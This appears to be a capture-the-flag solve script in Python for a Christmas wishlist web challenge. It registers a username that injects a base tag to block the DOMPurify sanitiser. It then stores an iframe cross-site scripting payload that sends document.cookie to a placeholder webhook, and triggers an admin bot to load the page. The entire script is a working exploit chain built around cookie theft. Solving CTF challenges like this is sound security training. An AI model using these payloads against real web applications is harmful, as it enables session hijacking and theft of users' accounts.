import requests

# Change according to setup
URL = "http://localhost:34867"
WEBHOOK = "<WEBHOOK_URL>"

s = requests.Session()

# Register a user with the HTML injection that changes the base URI and blocks DOMpurifier from loading from /parser.js
# We need to break out of the title element first, and still follow the email format
reg_data = {
    "username": "</title><base href=http://x.x>@x",
    "password": "adadad"
}
r = s.post(f"{URL}/register", data=reg_data)
print("Register:", r.status_code)

# Create wishlist with malicious iframe due to the missing CSP directives
note = f"<iframe srcdoc='<script src=data:text/javascript,window.location=`{WEBHOOK}/flag?flag=`+document.cookie></script>'></iframe>"
r = s.post(f"{URL}/wishlist", data={"item": note})
print("Wishlist update:", r.status_code, r.text)

# Trigger Santa bot that will automatically take the wishlistId from our session and visit the stored XSS
r = s.get(f"{URL}/send")
print("Send:", r.status_code, r.text)
